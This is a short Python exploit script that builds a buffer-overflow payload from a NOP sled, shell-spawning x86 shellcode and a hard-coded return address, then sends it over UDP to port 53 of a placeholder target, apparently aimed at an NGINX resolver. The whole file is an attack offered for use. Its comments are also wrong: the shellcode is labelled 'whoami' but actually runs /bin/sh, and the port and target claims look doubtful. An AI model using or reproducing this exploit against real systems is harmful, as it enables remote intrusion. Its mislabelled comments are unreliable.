import socket
import struct

def create_payload():
    # Shellcode to execute 'whoami'
    shellcode = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
        b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    )

    # NOP sled to increase the chances of hitting the shellcode
    nop_sled = b"\x90" * (1024 - len(shellcode))

    # Return address to jump to the NOP sled
    # This address needs to be carefully chosen based on the target environment
    return_address = struct.pack("<I", 0xbffff7ac)

    # Construct the payload
    payload = nop_sled + shellcode + return_address
    return payload

def exploit(target_ip, target_port):
    payload = create_payload()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(payload, (target_ip, target_port))
    s.close()

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with the target IP
    target_port = 53  # NGINX resolver typically uses port 53
    exploit(target_ip, target_port)